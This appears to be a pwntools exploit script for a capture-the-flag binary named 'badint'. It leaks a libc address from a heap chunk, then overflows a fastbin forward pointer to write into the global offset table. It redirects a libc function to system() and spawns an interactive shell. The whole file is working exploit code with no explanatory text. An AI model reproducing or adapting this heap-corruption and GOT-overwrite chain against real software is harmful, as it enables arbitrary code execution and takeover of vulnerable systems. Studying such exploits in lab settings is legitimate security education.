from pwn import *
io = process('./badint')
context.log_level = 'debug'
pause()

def add_hex_string(idx, offset, data, LSF):
    io.recvuntil('SEQ #:')
    io.sendline(str(idx))
    io.recvuntil('Offset:')
    io.sendline(str(offset))
    io.recvuntil('Data:')
    io.sendline(data)
    io.recvuntil('LSF Yes/No:')
    if LSF:
        io.sendline('Yes')
    else:
        io.sendline('No')

def convert(num):
    ret = ""
    while num != 0:
        now = num & 0xff
        num >>= 8
        ret = ret + '{:02x}'.format(now)
    return ret.ljust(16, "0")

s = '1' * 0x90 * 2 # make a chunk which is 0x90 size
add_hex_string(1, 8, s, 1)
io.recvuntil(']: ')
libc_addr = u64(io.recvn(16).decode('hex'))
log.info('libc_addr :' + hex(libc_addr))

libc = ELF('./libc-64')
libc.address = libc_addr - 0x7f6e69b47b78 + 0x00007f6e69784000

# arrange heap
s = '3' * 0x58 * 2 
add_hex_string(1, 0, s, 1)
s = '4' * 0x38 * 2
add_hex_string(1, 0, s, 1)

# overflow the fastbin->fd
payload = convert(0x41)
payload += convert(0x604042)
payload += convert(0) * 6
payload += convert(0x31)
payload = payload.ljust(0x58 * 2, '0')

add_hex_string(1, 0x60-0x8, payload, 1)

# overwrite got
payload = 'a' * 6 * 2
payload += convert(0x400b26) #fgets
payload += convert(0x400b36) #strlen
payload += convert(libc.symbols['system'])
payload = payload.ljust(110, '0')

add_hex_string(1, 0, payload, 1)
io.sendline('sh')
io.interactive()

